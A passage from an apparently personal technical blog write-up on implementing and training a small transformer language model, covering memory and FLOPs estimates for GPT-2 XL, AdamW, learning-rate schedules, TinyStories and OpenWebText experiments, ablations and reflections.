inline">\(4BTd\)</span></td></tr><tr class="odd"><td>SiLU output</td><td><span class="math inline">\((B,T,d_{ff})\)</span></td><td><span class="math inline">\(4BTd\)</span></td></tr><tr class="even"><td>Gate⊙Value = W2 input</td><td><span class="math inline">\((B,T,d_{ff})\)</span></td><td><span class="math inline">\(4BTd\)</span></td></tr></tbody></table><p>Per-layer activations ≈ <span class="math inline">\(22BTd +BHT^2\)</span></p><p>Plus non-layer components: embedding output (<spanclass="math inline">\(BTd\)</span>) + logits (<spanclass="math inline">\(BTV\)</span>) + cross-entropy softmax (<spanclass="math inline">\(BTV\)</span>) ≈ <span class="math inline">\(BTd +2BTV\)</span></p><p><span class="math display">\[\text{Total activation memory} = 4 \times \left[L(22BTd + BHT^2) + BTd +2BTV\right] \text{ bytes}\]</span></p><p><span class="math display">\[\boxed{\text{Peak Memory} = 16P + 4BT\left[L(22d + HT) + d + 2V\right]}\]</span></p><h4 id="gpt-2-xl-concrete-example">3.11.3 GPT-2 XL Concrete Example</h4><p><span class="math inline">\(d=1600, L=48, H=25, T=1024,V=50257\)</span></p><p><strong>(a) Detailed parameter count:</strong></p><p>Per-layer parameters:</p><table><colgroup><col style="width: 25%" /><col style="width: 74%" /></colgroup><thead><tr class="header"><th>Component</th><th>Parameters</th></tr></thead><tbody><tr class="odd"><td><span class="math inline">\(W_Q, W_K, W_V, W_O\)</span></td><td><span class="math inline">\(4 \times d^2 = 4 \times 2{,}560{,}000 =10{,}240{,}000\)</span></td></tr><tr class="even"><td><span class="math inline">\(W_1, W_2, W_3\)</span> (FFN)</td><td><span class="math inline">\(3 \times d \times d_{ff} = 3 \times10{,}240{,}000 = 30{,}720{,}000\)</span></td></tr><tr class="odd"><td>2 × RMSNorm</td><td><span class="math inline">\(2 \times 1{,}600 = 3{,}200\)</span></td></tr><tr class="even"><td><strong>Per-layer total</strong></td><td><strong>40,963,200</strong></td></tr></tbody></table><p>Full model:</p><table><colgroup><col style="width: 38%" /><col style="width: 61%" /></colgroup><thead><tr class="header"><th>Component</th><th>Parameters</th></tr></thead><tbody><tr class="odd"><td>48 layers</td><td><span class="math inline">\(48 \times 40{,}963{,}200 =1{,}966{,}233{,}600\)</span></td></tr><tr class="even"><td>Token Embedding (<span class="math inline">\(V \timesd\)</span>)</td><td><span class="math inline">\(80{,}411{,}200\)</span></td></tr><tr class="odd"><td>LM Head (<span class="math inline">\(V \times d\)</span>)</td><td><span class="math inline">\(80{,}411{,}200\)</span></td></tr><tr class="even"><td>Final RMSNorm</td><td><span class="math inline">\(1{,}600\)</span></td></tr><tr class="odd"><td><strong>Total</strong></td><td><strong>≈ 2.13B</strong></td></tr></tbody></table><p>Parameter memory: <span class="math inline">\(2.13\text{B} \times 4\text{ bytes} \approx 8.51 \text{ GB}\)</span></p><p><strong>(b) Memory analysis:</strong></p><p><strong>Model-related memory (fixed)</strong>: <spanclass="math inline">\(16P = 16 \times 2.13 \times 10^9 \approx 34.0\text{ GB}\)</span></p><p><strong>Activation memory (per batch element)</strong>: <spanclass="math display">\[L(22d + HT) + d + 2V = 48(22 \times 1600 + 25 \times 1024) + 1600 + 2\times 50257\]</span></p><p><span class="math display">\[= 48(35200 + 25600) + 102114 = 48 \times 60800 + 102114 = 2{,}920{,}514\]</span></p><p><span class="math display">\[\text{Per batch element}: 4 \times 1024 \times 2{,}920{,}514 \approx12.0 \text{ GB}\]</span></p><p><strong>Maximum batch size on 80GB A100</strong>: <spanclass="math display">\[\text{Total memory}: 34.0 + 12.0 \times B \leq 80 \text{ GB}\]</span></p><p><span class="math display">\[B \leq (80 - 34) / 12 \approx 3.8 \rightarrow \boxed{B_{\max} = 3}\]</span></p><h4 id="why-forward-pass-2-parameters-flopstoken">3.11.4 Why ForwardPass ≈ 2 × Parameters FLOPs/token?</h4><p>Transformer computation is dominated by matrix multiplications. For amatmul <span class="math inline">\(Y = X \times W\)</span> where <spanclass="math inline">\(W\)</span> has shape <spanclass="math inline">\((d_{in}, d_{out})\)</span>:</p><ul><li>Each output element requires <spanclass="math inline">\(d_{in}\)</span> multiplications + <spanclass="math inline">\(d_{in}\)</span> additions = <spanclass="math inline">\(2d_{in}\)</span> FLOPs</li><li>There are <span class="math inline">\(d_{out}\)</span> outputelements (per token)</li><li>Total FLOPs = <span class="math inline">\(2 \times d_{in} \timesd_{out}\)</span> = <strong>2 × parameter count</strong></li></ul><p><strong>Per-layer matmul breakdown</strong> (×<spanclass="math inline">\(L\)</span> layers), using GPT-2 XL numbers (<spanclass="math inline">\(d=1600, T=1024, H=25, d_k=64,d_{ff}=6400\)</span>):</p><table style="width:100%;"><colgroup><col style="width: 23%" /><col style="width: 41%" /><col style="width: 22%" /><col style="width: 12%" /></colgroup><thead><tr class="header"><th>Operation</th><th>Dimensions</th><th>FLOPs Formula</th><th>FLOPs</th></tr></thead><tbody><tr class="odd"><td>Q projection</td><td><span class="math inline">\((T,d) \times (d,d)\)</span></td><td><span class="math inline">\(2Td^2\)</span></td><td>5.24B</td></tr><tr class="even"><td>K projection</td><td>same</td><td><span class="math inline">\(2Td^2\)</span></td><td>5.24B</td></tr><tr class="odd"><td>V projection</td><td>same</td><td><span class="math inline">\(2Td^2\)</span></td><td>5.24B</td></tr><tr class="even"><td>O projection</td><td>same</td><td><span class="math inline">\(2Td^2\)</span></td><td>5.24B</td></tr><tr class="odd"><td><span class="math inline">\(QK^T\)</span> (<spanclass="math inline">\(H\)</span> heads)</td><td><span class="math inline">\(H \times (T,d_k) \times(d_k,T)\)</span></td><td><span class="math inline">\(2T^2d\)</span></td><td>3.36B</td></tr><tr class="even"><td>attn_weights × V</td><td><span class="math inline">\(H \times (T,T) \times(T,d_k)\)</span></td><td><span class="math inline">\(2T^2d\)</span></td><td>3.36B</td></tr><tr class="odd"><td>FFN W1</td><td><span class="math inline">\((T,d) \times (d,d_{ff})\)</span></td><td><span class="math inline">\(2Td \cdot d_{ff}\)</span></td><td>20.97B</td></tr><tr class="even"><td>FFN W3</td><td>same</td><td><span class="math inline">\(2Td \cdot d_{ff}\)</span></td><td>20.97B</td></tr><tr class="odd"><td>FFN W2</td><td><span class="math inline">\((T,d_{ff}) \times(d_{ff},d)\)</span></td><td><span class="math inline">\(2Td \cdot d_{ff}\)</span></td><td>20.97B</td></tr><tr class="even"><td><strong>Per-layer total</strong></td><td></td><td></td><td><strong>90.60B</strong></td></tr></tbody></table><p><strong>Model-level FLOPs:</strong></p><table><thead><tr class="header"><th>Component</th><th>FLOPs</th></tr></thead><tbody><tr class="odd"><td>48 layers</td><td>4,348.7B</td></tr><tr class="even"><td>LM Head: <span class="math inline">\((T,d) \times(d,V)\)</span></td><td>164.7B</td></tr><tr class="odd"><td><strong>Total</strong></td><td><strong>≈ 4.51 TFLOPs</strong></td></tr></tbody></table><h4 id="flops-breakdown-across-model-sizes">3.11.5 FLOPs BreakdownAcross Model Sizes</h4><p><strong>(c)</strong> Per-layer, FFN accounts for ~69.5% (62.91B /90.60B), making it the most compute-heavy component. Attentionprojections account for 23.1%, while attention scores (<spanclass="math inline">\(QK^T\)</span> + attn×V) are only 7.4%.</p><table><colgroup><col style="width: 27%" /><col style="width: 17%" /><col style="width: 20%" /><col style="width: 18%" /><col style="width: 15%" /></colgroup><thead><tr class="header"><th>Component</th><th>Small (12L, 768)</th><th>Medium (24L, 1024)</th><th>Large (36L, 1280)</th><th>XL (48L, 1600)</th></tr></thead><tbody><tr class="odd"><td>Attn projections</td><td>16.6%</td><td>20.0%</td><td>21.4%</td><td>22.3%</td></tr><tr class="even"><td>Attn scores (<span class="math inline">\(QK^T\)</span> etc.)</td><td>11.1%</td><td>10.0%</td><td>8.6%</td><td><strong>7.1%</strong></td></tr><tr class="odd"><td>FFN</td><td>49.7%</td><td>59.9%</td><td>64.2%</td><td><strong>66.9%</strong></td></tr><tr class="even"><td>LM Head</td><td>22.6%</td><td>10.2%</td><td>5.8%</td><td>3.7%</td></tr></tbody></table><p><strong>(d) Trend</strong>: As models grow larger, FFN’s shareincreases (50% → 67%) while LM Head’s share drops significantly (23% →4%). This is because the LM head has a fixed size per layer (tied tovocab_size), whereas FFN grows with both num_layers and d_model.</p><h4 id="context-length-scaling-why-flashattention-matters">3.11.6Context Length Scaling: Why FlashAttention Matters</h4><p><strong>(e)</strong> Increasing context_length from 1024 to16384:</p><table><thead><tr class="header"><th>Component</th><th>T=1024</th><th>T=16384</th></tr></thead><tbody><tr class="odd"><td>Attn projections</td><td>22.3%</td><td>10.8%</td></tr><tr class="even"><td>Attn scores</td><td><strong>7.1%</strong></td><td><strong>55.2%</strong></td></tr><tr class="odd"><td>FFN</td><td>66.9%</td><td>32.3%</td></tr><tr class="even"><td>LM Head</td><td>3.7%</td><td>1.8%</td></tr><tr class="odd"><td><strong>Total FLOPs</strong></td><td><strong>4.51T</strong></td><td><strong>≈ 149.5T (33×)</strong></td></tr></tbody></table><p>Total FLOPs increase ~33× (not 16×!) because attention scores scaleas <span class="math inline">\(O(T^2)\)</span>. When context lengthgrows 16×, attention scores jump from 7.1% to 55.2%, becoming thedominant cost. This is precisely why long-context models require<strong>FlashAttention</strong> and other IO-aware attentionoptimizations — the quadratic attention cost overwhelms the linear FFNcost at long sequences.</p><h4 id="why-backward-pass-2-forward">3.11.7 Why Backward Pass ≈ 2×Forward?</h4><p>For each matmul <span class="math inline">\(Y = XW\)</span>,backpropagation requires computing two gradients:</p><ul><li><span class="math inline">\(\frac{\partial L}{\partial X} =\frac{\partial L}{\partial Y} \times W^T\)</span> (one matmul)</li><li><span class="math inline">\(\frac{\partial L}{\partial W} = X^T\times \frac{\partial L}{\partial Y}\)</span> (one matmul)</li></ul><p>That’s <strong>2 matmuls</strong> for backward vs. 1 for forward.Therefore:</p><p><span class="math display">\[\boxed{\text{Backward} \approx 2 \times \text{Forward}}\]</span></p><p><span class="math display">\[\text{Total = Forward + Backward} \approx 3 \times \text{Forward} = 6PBT\]</span></p><h4 id="adamw-per-step-flops">3.11.8 AdamW Per-Step FLOPs</h4><p>Operations performed for each parameter:</p><table><colgroup><col style="width: 14%" /><col style="width: 51%" /><col style="width: 34%" /></colgroup><thead><tr class="header"><th>Operation</th><th>Formula</th><th>FLOPs/param</th></tr></thead><tbody><tr class="odd"><td>Update m</td><td><span class="math inline">\(m = \beta_1 m +(1-\beta_1)g\)</span></td><td>3 (2 mul + 1 add)</td></tr><tr class="even"><td>Update v</td><td><span class="math inline">\(v = \beta_2 v +(1-\beta_2)g^2\)</span></td><td>4 (3 mul + 1 add)</td></tr><tr class="odd"><td>Param update</td><td><span class="math inline">\(p = \alpha_t \cdotm/(\sqrt{v}+\epsilon)\)</span></td><td>5 (sqrt, add, div, mul, sub)</td></tr><tr class="even"><td>Weight decay</td><td><span class="math inline">\(p -= lr \times \lambda \timesp\)</span></td><td>2 (mul + sub)</td></tr></tbody></table><p><span class="math display">\[\text{AdamW FLOPs} = 14P\]</span></p><p>(The bias correction <span class="math inline">\(\alpha_t\)</span> isa scalar computation, negligible. Much smaller than forward/backwardFLOPs.)</p><h4 id="gpt-2-xl-training-time-estimate">3.11.9 GPT-2 XL Training TimeEstimate</h4><p><strong>Per-step FLOPs</strong>:</p><ul><li>Forward ≈ <span class="math inline">\(2P \times B \times T\)</span>(each parameter does ~2 ops per token)</li><li>Backward ≈ <span class="math inline">\(2 \times\)</span>Forward</li><li>Total ≈ <span class="math inline">\(3 \times\)</span> Forward =<span class="math inline">\(6PBT\)</span></li></ul><p>Substituting GPT-2 XL (<span class="math inline">\(B=1024,T=1024\)</span>): <span class="math display">\[\text{Per step} = 6 \times 2.13 \times 10^9 \times 1024 \times 1024 =1.34 \times 10^{16} \text{ FLOPs/step}\]</span></p><p><strong>400K steps total</strong>: <spanclass="math inline">\(400{,}000 \times 1.34 \times 10^{16} = 5.36 \times10^{21}\)</span> FLOPs</p><p><strong>Effective throughput</strong>: 50% × 19.5 TFLOP/s = <spanclass="math inline">\(9.75 \times 10^{12}\)</span> FLOP/s</p><p><span class="math display">\[\text{Time} = \frac{5.36 \times 10^{21}}{9.75 \times 10^{12}} \approx5.5 \times 10^8 \text{ sec} \approx 6{,}360 \text{ days} \approx\boxed{17.4 \text{ years}}\]</span></p><p>This explains why large-scale model training requires massive GPUparallelism — training GPT-2 XL on a single A100 would take 17years!</p><hr /><h2 id="training-infrastructure">4. Training Infrastructure</h2><h3 id="cross-entropy-loss">4.1 Cross-Entropy Loss</h3><p>Numerically stable implementation using the log-sum-exp trick:</p><p><span class="math display">\[\ell_i = -\log \text{softmax}(o_i)[x_{i+1}] = \log\left(\sum_j e^{o_j -o_{\max}}\right) - (o_{x_{i+1}} - o_{\max})\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cross_entropy</span>(<span class="params">inputs, targets</span>):</span><br><span class="line">    shifted = inputs - inputs.<span class="built_in">max</span>(dim=-<span class="number">1</span>, keepdim=<span class="literal">True</span>).values</span><br><span class="line">    log_sum_exp = torch.log(torch.<span class="built_in">sum</span>(torch.exp(shifted), dim=-<span class="number">1</span>))</span><br><span class="line">    target_logits = shifted.gather(dim=-<span class="number">1</span>, index=targets.unsqueeze(-<span class="number">1</span>)).squeeze(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (log_sum_exp - target_logits).mean()</span><br></pre></td></tr></table></figure><h3 id="adamw-optimizer">4.2 AdamW Optimizer</h3><p>Implementing AdamW (Loshchilov &amp; Hutter, 2019) with<strong>decoupled weight decay</strong>:</p><p><span class="math display">\[m_t = \beta_1 m_{t-1} + (1 - \beta_1) g_t\]</span></p><p><span class="math display">\[v_t = \beta_2 v_{t-1} + (1 - \beta_2) g_t^2\]</span></p><p><span class="math display">\[\hat{\alpha}_t = \alpha \cdot \frac{\sqrt{1 - \beta_2^t}}{1 - \beta_1^t}\]</span></p><p><span class="math display">\[\theta_t = \theta_{t-1} - \hat{\alpha}_t \cdot \frac{m_t}{\sqrt{v_t} +\epsilon} - \alpha \lambda \theta_{t-1}\]</span></p><p>Key distinction from L2 regularization: weight decay is applied as aseparate step using the <strong>base learning rate</strong> <spanclass="math inline">\(\alpha\)</span>, not the bias-corrected rate. Thisis the “decoupled” part of AdamW.</p><p><strong>AdamW Memory Accounting</strong>: For each parameter, AdamWmaintains 2 additional tensors (<span class="math inline">\(m\)</span>and <span class="math inline">\(v\)</span>), so the optimizer staterequires <strong>2× the model parameters</strong> in memory. With themodel weights themselves, the total is <strong>3× model size</strong>(excluding gradients). Including gradients, it’s <strong>4× modelsize</strong> in float32.</p><h3 id="cosine-learning-rate-schedule-with-warmup">4.3 Cosine LearningRate Schedule with Warmup</h3><p>Three phases (following LLaMA):</p><ol type="1"><li><strong>Linear warmup</strong> (<span class="math inline">\(t &lt;T_w\)</span>): <span class="math inline">\(\alpha_t = \frac{t}{T_w}\cdot \alpha_{\max}\)</span></li><li><strong>Cosine annealing</strong> (<span class="math inline">\(T_w\leq t \leq T_c\)</span>): <span class="math inline">\(\alpha_t =\alpha_{\min} + \frac{1}{2}(1 + \cos(\frac{t - T_w}{T_c - T_w} \cdot\pi)) \cdot (\alpha_{\max} - \alpha_{\min})\)</span></li><li><strong>Constant minimum</strong> (<span class="math inline">\(t&gt; T_c\)</span>): <span class="math inline">\(\alpha_t =\alpha_{\min}\)</span></li></ol><p><strong>Purpose of warmup</strong>: In the early stages of training,the model parameters are randomly initialized and gradients can be verynoisy and large. A learning rate warmup prevents the optimizer fromtaking excessively large steps that could destabilize training or causedivergence. It gives Adam’s moment estimates time to accumulatemeaningful statistics before using the full learning rate.</p><h3 id="gradient-clipping">4.4 Gradient Clipping</h3><p>L2-norm gradient clipping for training stability:</p><p><span class="math display">\[\text{If } \|g\|_2 &gt; M: \quad g \leftarrow g \cdot \frac{M}{\|g\|_2 +\epsilon}\]</span></p><p>where <span class="math inline">\(M\)</span> is the max allowed norm(typically 1.0) and <span class="math inline">\(\epsilon =10^{-6}\)</span>.</p><hr /><h2 id="training-loop">5. Training Loop</h2><h3 id="data-loading">5.1 Data Loading</h3><p>For a dataset of <span class="math inline">\(n\)</span> tokens, eachbatch randomly samples <span class="math inline">\(B\)</span> startpositions and creates:</p><ul><li><strong>Input</strong>:<code>dataset[i : i + context_length]</code></li><li><strong>Target</strong>:<code>dataset[i+1 : i+1 + context_length]</code></li></ul><p>Data is stored as memory-mapped uint16 numpy arrays for efficientrandom access without loading the entire dataset into RAM.</p><h3 id="checkpointing">5.2 Checkpointing</h3><p>Checkpoints save:</p><ul><li><code>model_state_dict</code>: All model parameters</li><li><code>optimizer_state_dict</code>: Optimizer states (moments, stepcount)</li><li><code>iteration</code>: Current training step</li></ul><p>This enables resuming training from any checkpoint with fulloptimizer state recovery.</p><h3 id="training-configuration">5.3 Training Configuration</h3><p><strong>TinyStories (default experiments):</strong></p><table><thead><tr class="header"><th>Parameter</th><th>Value</th></tr></thead><tbody><tr class="odd"><td>Vocab size</td><td>10,000</td></tr><tr class="even"><td>Context length</td><td>256</td></tr><tr class="odd"><td>d_model</td><td>512</td></tr><tr class="even"><td>Layers</td><td>4</td></tr><tr class="odd"><td>Heads</td><td>16</td></tr><tr class="even"><td>d_ff</td><td>1,344</td></tr><tr class="odd"><td>Learning rate</td><td>1e-3 (varies)</td></tr><tr class="even"><td>Batch size</td><td>256 (varies)</td></tr><tr class="odd"><td>Max steps</td><td>5,000</td></tr><tr class="even"><td>Warmup steps</td><td>500</td></tr><tr class="odd"><td>Weight decay</td><td>0.1</td></tr><tr class="even"><td>Gradient clip</td><td>1.0</td></tr></tbody></table><hr /><h2 id="text-generation">6. Text Generation</h2><h3 id="autoregressive-generation">6.1 Autoregressive Generation</h3><p>The model generates text one token at a time:</p><ol type="1"><li>Encode the prompt into token IDs</li><li>Feed through the model to get logits for the next token</li><li>Apply <strong>temperature scaling</strong>:<code>logits / temperature</code></li><li>(Optional) Apply <strong>top-p / nucleus sampling</strong>: keeponly tokens whose cumulative probability ≤ p</li><li>Sample from the resulting distribution</li><li>Append the sampled token and repeat</li></ol><p><strong>Temperature</strong> controls randomness:</p><ul><li><code>T → 0</code>: Greedy (argmax), deterministic butrepetitive</li><li><code>T = 1.0</code>: Standard sampling from the model’sdistribution</li><li><code>T &gt; 1.0</code>: More random, more diverse but potentiallyless coherent</li></ul><p><strong>Top-p (nucleus) sampling</strong> (Holtzman et al., 2019):Instead of sampling from the full distribution, keep only the smallestset of tokens whose cumulative probability exceeds <spanclass="math inline">\(p\)</span>, then renormalize. This dynamicallyadapts the number of candidate tokens based on the model’sconfidence.</p><h3 id="generated-samples">6.2 Generated Samples</h3><p>Example generations from the TinyStories model (temperature=0.8,top_p=0.9):</p><blockquote><p><strong>Prompt</strong>: “Once upon a time”</p><p>Once upon a time, there was a little girl named Lily. She loved toplay outside in the park. One day, she saw a big, red ball on theground. She picked it up and started to bounce it. “Look, Mommy!” shesaid. “I found a ball!” Her mommy smiled and said, “That’s a great find,Lily…”</p></blockquote><p>The model successfully learns:</p><ul><li><strong>Coherent narrative structure</strong> with beginning,middle, and end</li><li><strong>Correct grammar</strong> and dialogue formatting</li><li><strong>Character consistency</strong> (names, pronouns)</li><li><strong>Story conventions</strong> typical of children’s stories(morals, simple conflicts)</li></ul><p>Note: The <code>&lt;|endoftext|&gt;</code> token sometimes appearsmid-generation. This is not a bug — it’s the <strong>documentseparator</strong> used in training data. The model learned that thistoken marks the boundary between stories and may generate new storiesafter it.</p><hr /><h2 id="experiments">7. Experiments</h2><p>All experiments use the TinyStories dataset with the configurationdescribed in Section 5.3 unless otherwise noted. Results are logged viaWeights &amp; Biases.</p><h3 id="learning-rate-sweep">7.1 Learning Rate Sweep</h3><p><strong>Setup</strong>: Fixed batch_size=256, max_steps=5000,warmup=500. Sweep lr ∈ {5e-4, 1e-3, 2e-3, 5e-3, 1e-2}.</p><table><thead><tr class="header"><th>Learning Rate</th><th>Final Val Loss</th><th>Val Perplexity</th></tr></thead><tbody><tr class="odd"><td>1e-2</td><td><strong>1.3004</strong></td><td><strong>3.671</strong></td></tr><tr class="even"><td>5e-3</td><td>1.3171</td><td>3.733</td></tr><tr class="odd"><td>2e-3</td><td>1.3567</td><td>3.883</td></tr><tr class="even"><td>1e-3</td><td>1.3974</td><td>4.045</td></tr><tr class="odd"><td>5e-4</td><td>1.4930</td><td>4.450</td></tr></tbody></table><p><strong>Analysis</strong>: Higher learning rates consistently achievelower loss within 5000 steps. The best learning rate is lr=1e-2 with valloss 1.3004 and perplexity 3.671. This is somewhat surprising — onemight expect such a high learning rate to cause instability, but thecombination of warmup, cosine annealing, gradient clipping, and RMSNormprovides sufficient regularization.</p><p>The trend is monotonic in this range: higher LR → lower loss. Thissuggests the model is still in the regime where it benefits from moreaggressive optimization, likely because 5000 steps is relatively few forthis model size.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208225124153.png" alt="image-20260208225124153" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208224958480.png" alt="image-20260208224958480" style="zoom:80%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208225043193.png" alt="image-20260208225043193" style="zoom:80%;" /></p><h3 id="batch-size-experiment">7.2 Batch Size Experiment</h3><p><strong>Setup</strong>: Fixed lr=1e-3, varying batch size withproportional step adjustments to maintain roughly the same number oftoken updates.</p><table><thead><tr class="header"><th>Batch Size</th><th>Steps</th><th>Final Val Loss</th><th>Val Perplexity</th></tr></thead><tbody><tr class="odd"><td>16</td><td>80,000</td><td><strong>1.3264</strong></td><td><strong>3.768</strong></td></tr><tr class="even"><td>64</td><td>20,000</td><td>1.3318</td><td>3.788</td></tr><tr class="odd"><td>128</td><td>10,000</td><td>1.3560</td><td>3.881</td></tr><tr class="even"><td>512</td><td>2,500</td><td>1.4805</td><td>4.395</td></tr></tbody></table><p><strong>Analysis</strong>: Smaller batch sizes achieve better finalloss when training for the same number of total tokens. The best resultis batch_size=16 with val loss 1.3264.</p><p>This aligns with the “generalization gap” theory: smaller batchesintroduce more noise in gradient estimates, which acts as implicitregularization and can lead to flatter minima with bettergeneralization. However, smaller batches are also more computationallyexpensive due to lower hardware utilization.</p><p>In practice, the choice of batch size involves a trade-offbetween:</p><ul><li><strong>Computational efficiency</strong>: Larger batches betterutilize GPU parallelism</li><li><strong>Generalization</strong>: Smaller batches tend to generalizebetter</li><li><strong>Convergence speed</strong>: Smaller batches need more stepsbut see the same number of token</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208225239934.png" alt="image-20260208225239934" style="zoom:80%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208225353926.png" alt="image-20260208225353926" style="zoom:80%;" /></p><h3 id="ablation-studies">7.3 Ablation Studies</h3><p><strong>Setup</strong>: Fixed lr=1e-3, batch_size=256,max_steps=5000. Each ablation modifies one aspect of the baselinearchitecture.</p><table><colgroup><col style="width: 58%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 8%" /></colgroup><thead><tr class="header"><th>Configuration</th><th>Final Val Loss</th><th>Val Perplexity</th><th>Δ Loss</th></tr></thead><tbody><tr class="odd"><td><strong>Baseline</strong> (pre-norm + RMSNorm + RoPE + SwiGLU)</td><td><strong>1.3974</strong></td><td><strong>4.045</strong></td><td>—</td></tr><tr class="even"><td>Post-norm (instead of pre-norm)</td><td>1.4095</td><td>4.094</td><td>+0.0121</td></tr><tr class="odd"><td>No RMSNorm (Identity normalization)</td><td>1.4400</td><td>4.221</td><td>+0.0426</td></tr><tr class="even"><td>SiLU FFN (instead of SwiGLU)</td><td>1.4649</td><td>4.327</td><td>+0.0675</td></tr><tr class="odd"><td>No RoPE (NoPE — no positional encoding)</td><td>1.4712</td><td>4.354</td><td>+0.0738</td></tr></tbody></table><p><strong>Analysis by component importance</strong> (most to leastcritical):</p><ol type="1"><li><p><strong>RoPE</strong> (Δ = +0.074): The most impactful component.Without positional encoding, the model has no way to distinguish tokenorder. Remarkably, NoPE still achieves reasonable perplexity (4.354),suggesting that the model can partially infer order from semanticcontext and causal masking alone. But positional information clearlyprovides a significant boost.</p></li><li><p><strong>SwiGLU</strong> (Δ = +0.068): Replacing SwiGLU with SiLUFFN (matched parameter count) hurts by 0.068 in loss. The gatingmechanism in SwiGLU provides finer control over information flow throughthe FFN, leading to better representation learning.</p></li><li><p><strong>RMSNorm</strong> (Δ = +0.043): Removing normalizationentirely degrades performance, confirming that normalization isimportant for training stability and representation quality. Without it,activations can grow unboundedly through the residualconnections.</p></li><li><p><strong>Pre-norm vs Post-norm</strong> (Δ = +0.012): The smallestdifference. Post-norm slightly underperforms pre-norm, consistent withthe literature showing that pre-norm is more training-stable. However,the gap is small for this model size and training duration.</p></li></ol><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208230125952.png" alt="image-20260208230125952" style="zoom:80%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208230058900.png" alt="image-20260208230146528" style="zoom:100%;" /></p><h3 id="openwebtext-owt-training">7.4 OpenWebText (OWT) Training</h3><p><strong>Setup</strong>: GPT-2 Small architecture (117M parameters)trained on OpenWebText.</p><table><thead><tr class="header"><th>Parameter</th><th>Value</th></tr></thead><tbody><tr class="odd"><td>Config</td><td>GPT-2 Small</td></tr><tr class="even"><td>Vocab size</td><td>50,257</td></tr><tr class="odd"><td>Context length</td><td>1,024</td></tr><tr class="even"><td>d_model</td><td>768</td></tr><tr class="odd"><td>Layers</td><td>12</td></tr><tr class="even"><td>Heads</td><td>12</td></tr><tr class="odd"><td>d_ff</td><td>2,048</td></tr><tr class="even"><td>Batch size</td><td>8</td></tr><tr class="odd"><td>Max steps</td><td>10,000</td></tr><tr class="even"><td>LR</td><td>1e-3</td></tr></tbody></table><table><thead><tr class="header"><th>Metric</th><th>Value</th></tr></thead><tbody><tr class="odd"><td>Final Val Loss</td><td>3.9364</td></tr><tr class="even"><td>Final Val Perplexity</td><td>51.236</td></tr></tbody></table><p><strong>Analysis</strong>: The OWT training achieves a validationperplexity of ~51, which is reasonable for 10K steps of training on a117M parameter model. For reference:</p><ul><li>GPT-2 (117M) trained for 300K steps achieves perplexity ~30 onWebText</li><li>Our model has seen far fewer tokens but shows clear learning (lossdecreasing throughout training)</li></ul><p>The main bottleneck was <strong>GPU memory</strong>: batch_size=64with context_length=1024 caused OOM on a single 80GB A100. Reducing tobatch_size=8 resolved this, but it means each step processes fewertokens. Gradient accumulation could be used to simulate larger effectivebatch sizes without additional memory cost.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208230235210.png" alt="image-20260208230235210" style="zoom:80%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260208230218497.png" alt="image-20260208230218497" style="zoom:80%;" /></p><hr /><h2 id="reflections">8. Reflections</h2><h3 id="what-i-learned">8.1 What I Learned</h3><p><strong>Implementing from scratch matters.</strong> Building everycomponent from <code>nn.Parameter</code> and <code>torch.empty</code>forces you to understand the exact data flow, shapes, and numericalconsiderations at each step. For example:</p><ul><li><p><strong>RMSNorm precision</strong>: Without casting to float32,the mean-of-squares computation can overflow in float16/bfloat16,leading to NaN losses. This is a subtle bug that wouldn’t be caught byunit tests in float32.</p></li><li><p><strong>Weight initialization</strong>: The truncated normalinitialization significantly impacts training stability. Too wide →gradient explosion; too narrow → vanishing gradients. The <spanclass="math inline">\(\sigma = \sqrt{2/(d_{in} + d_{out})}\)</span>formula (Glorot-like) keeps the variance roughly constant acrosslayers.</p></li><li><p><strong>Causal mask efficiency</strong>: Pre-computing the causalmask as a buffer and slicing it per forward pass is much more efficientthan creating it fresh each time, especially for longsequences.</p></li></ul><p><strong>Tokenizer training is the hidden bottleneck.</strong> BPEtraining on large corpora requires careful memory management:</p><ul><li>Pre-tokenization can generate millions of unique byte sequences</li><li>Pair frequency tables can grow to tens of GB</li><li>Without incremental index updates, each merge iteration would beO(corpus_size)</li><li>Parallel pre-tokenization provides near-linear speedup, but BPEmerging remains sequential</li></ul><p><strong>Hyperparameter sensitivity varies by component.</strong>Learning rate has the largest impact on training dynamics, whilearchitectural choices (pre-norm vs post-norm) can have surprisinglysmall effects for small models. This suggests that for quickexperiments, spending time on LR tuning is more valuable thanarchitectural variations.</p><h3 id="design-decisions">8.2 Design Decisions</h3><ol type="1"><li><p><strong>Shared RoPE module</strong>: Instead of each attentionlayer creating its own RoPE, a single instance is shared across alllayers. This saves memory and ensures consistent positionalencoding.</p></li><li><p><strong>Ablation support via constructor arguments</strong>:Rather than creating separate model classes for each ablation, the<code>TransformerBlock</code> and <code>TransformerLM</code> acceptconfiguration flags (<code>norm_type</code>, <code>use_post_norm</code>,<code>use_rope</code>, <code>ffn_type</code>). This keeps the codebaseDRY while supporting all experimental variations.</p></li><li><p><strong>Memory-mapped data loading</strong>: Using<code>np.memmap</code> for training data avoids loading the entiredataset into RAM. Random batch sampling then reads only the neededslices, making it feasible to train on datasets much larger thanavailable memory.</p></li><li><p><strong>Parallel tokenizer encoding</strong>: The<code>encode_parallel</code> method splits text at<code>&lt;|endoftext|&gt;</code> boundaries, encodes chunks in parallel,saves intermediate results to disk, and merges them. This supportsresume and avoids OOM on large texts.</p></li></ol><h3 id="things-i-would-do-differently">8.3 Things I Would DoDifferently</h3><ul><li><strong>Learning rate warmup tuning</strong>: I used a fixed 500warmup steps across all experiments. Tuning this per-configuration(e.g., proportional to total steps) might improve results.</li><li><strong>Gradient accumulation</strong>: For the OWT experiment,implementing gradient accumulation would 